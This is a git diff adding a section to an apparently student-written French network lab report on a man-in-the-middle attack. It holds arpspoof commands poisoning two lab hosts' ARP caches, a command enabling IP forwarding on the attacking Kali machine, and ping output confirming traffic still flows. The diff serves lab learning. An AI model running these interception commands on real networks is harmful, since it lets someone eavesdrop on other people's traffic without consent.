@@ -688,7 +688,49 @@ Dispo dans 📁 p4_poisoning.pcap
 
 
 ## B. MITM
+Sur la machine attaquante
+```sh
+sudo arpspoof -i eth2 -t 10.1.1.210 10.1.1.211
+sudo arpspoof -i eth2 -t 10.1.1.211 10.1.1.210
+```
+Ajout du Forwading pour que Kali laisse passer les paquets qu'elle intercepte, afin que node1 et 2 parle trkl
+```sh
+sudo sysctl -w net.ipv4.ip_forward=1
+```
 
+- PING
+  ```sh
+  node 1:
+  node1> ping 10.1.1.211
+
+   84 bytes from 10.1.1.211 icmp_seq=1 ttl=63 time=8.464 ms
+  84 bytes from 10.1.1.211 icmp_seq=2 ttl=63 time=6.867 ms
+  84 bytes from 10.1.1.211 icmp_seq=3 ttl=63 time=7.001 ms
+  84 bytes from 10.1.1.211 icmp_seq=4 ttl=63 time=7.056 ms
+  84 bytes from 10.1.1.211 icmp_seq=5 ttl=63 time=8.063 ms
+  ```
+
+```sh
+node 2: 
+node2> ping 10.1.1.210
+
+84 bytes from 10.1.1.210 icmp_seq=1 ttl=63 time=6.193 ms
+84 bytes from 10.1.1.210 icmp_seq=2 ttl=63 time=6.472 ms
+84 bytes from 10.1.1.210 icmp_seq=3 ttl=63 time=2.769 ms
+84 bytes from 10.1.1.210 icmp_seq=4 ttl=63 time=6.432 ms
+84 bytes from 10.1.1.210 icmp_seq=5 ttl=63 time=4.088 ms
+```
+ les pings ont fontionnés. 
+
+ 
+  
+
+
+
+
+🌞 Proof !
+
+``
 
 
 
